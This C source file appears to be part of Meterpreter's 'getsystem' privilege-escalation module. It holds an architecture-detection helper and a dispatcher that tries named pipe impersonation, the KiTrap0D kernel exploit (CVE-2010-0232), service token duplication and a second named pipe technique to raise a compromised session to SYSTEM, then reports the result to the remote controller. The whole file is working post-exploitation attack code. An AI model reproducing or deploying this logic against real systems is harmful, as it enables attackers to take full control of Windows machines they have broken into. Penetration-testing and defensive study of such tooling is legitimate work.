#include "precomp.h"
#include "namedpipe.h"
#include "tokendup.h"
#include "kitrap0d.h"

/*
 * Get the native architecture of the system we are running on. (ripped from the stdapi's ps.c)
 */
DWORD elevate_getnativearch( VOID )
{
	HANDLE hKernel                           = NULL;
	GETNATIVESYSTEMINFO pGetNativeSystemInfo = NULL;
	DWORD dwNativeArch                       = PROCESS_ARCH_UNKNOWN;
	SYSTEM_INFO SystemInfo                   = {0};

	do
	{
		// default to 'x86' as if kernel32!GetNativeSystemInfo is not present then we are on an old x86 system.
		dwNativeArch = PROCESS_ARCH_X86;

		hKernel = LoadLibraryA( "kernel32.dll" );
		if( !hKernel )
			break;

		pGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddress( hKernel, "GetNativeSystemInfo" );
		if( !pGetNativeSystemInfo )
			break;
				
		pGetNativeSystemInfo( &SystemInfo );
		switch( SystemInfo.wProcessorArchitecture )
		{
			case PROCESSOR_ARCHITECTURE_AMD64:
				dwNativeArch = PROCESS_ARCH_X64;
				break;
			case PROCESSOR_ARCHITECTURE_IA64:
				dwNativeArch = PROCESS_ARCH_IA64;
				break;
			case PROCESSOR_ARCHITECTURE_INTEL:
				dwNativeArch = PROCESS_ARCH_X86;
				break;
			default:
				dwNativeArch = PROCESS_ARCH_UNKNOWN;
				break;
		}

	} while( 0 );

	if( hKernel )
		FreeLibrary( hKernel );

	return dwNativeArch;
}

/*
 * Attempt to elevate the current meterpreter to local system using a variety of techniques.
 */
DWORD elevate_getsystem( Remote * remote, Packet * packet )
{
	DWORD dwResult    = ERROR_SUCCESS;
	DWORD dwTechnique = ELEVATE_TECHNIQUE_ANY;
	Packet * response = NULL;

	do
	{
		response = packet_create_response( packet );
		if( !response )
			BREAK_WITH_ERROR( "[ELEVATE] get_system. packet_create_response failed", ERROR_INVALID_HANDLE );

		dwTechnique = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_TECHNIQUE );
		
		// if we are to to use ELEVATE_TECHNIQUE_ANY, we try everything at our disposal...
		if( dwTechnique == ELEVATE_TECHNIQUE_ANY )
		{
			do
			{
				// firstly, try to use the in-memory named pipe impersonation technique (Requires Local Admin rights)
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE;
				dwResult    = elevate_via_service_namedpipe( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;
			
				// secondly, try to use the in-memory KiTrap0D exploit (CVE-2010-0232) (Requires Local User rights and vulnerable system)
				// Note: If successfully, we end up replacing our processes primary token and as such cant rev3self at a later stage.
				dwTechnique = ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D;
				dwResult    = elevate_via_exploit_kitrap0d( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

				// thirdly, try to use the in-memory service token duplication technique (Requires Local Admin rights and SeDebugPrivilege)
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_TOKENDUP;
				dwResult    = elevate_via_service_tokendup( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

				// fourthly, try to use the touching disk named pipe impersonation technique (Requires Local Admin rights)
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2;
				dwResult    = elevate_via_service_namedpipe2( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

			} while( 0 );
		}
		else
		{
			// if we are to only use a specific technique, try the specified one and return the success...
			switch( dwTechnique )
			{
				case ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE:
					dwResult = elevate_via_service_namedpipe( remote, packet );
					break;
				case ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2:
					dwResult = elevate_via_service_namedpipe2( remote, packet );
					break;
				case ELEVATE_TECHNIQUE_SERVICE_TOKENDUP:
					dwResult = elevate_via_service_tokendup( remote, packet );
					break;
				case ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D:
					dwResult = elevate_via_exploit_kitrap0d( remote, packet );
					break;
				default:
					dwResult = ERROR_CALL_NOT_IMPLEMENTED;
					break;
			}
		}

	} while( 0 );

	if( response )
	{
		if( dwResult == ERROR_SUCCESS )
			packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE, dwTechnique );
		else
			packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE, ELEVATE_TECHNIQUE_NONE );

		packet_transmit_response( dwResult, remote, response );
	}

	return dwResult;
}
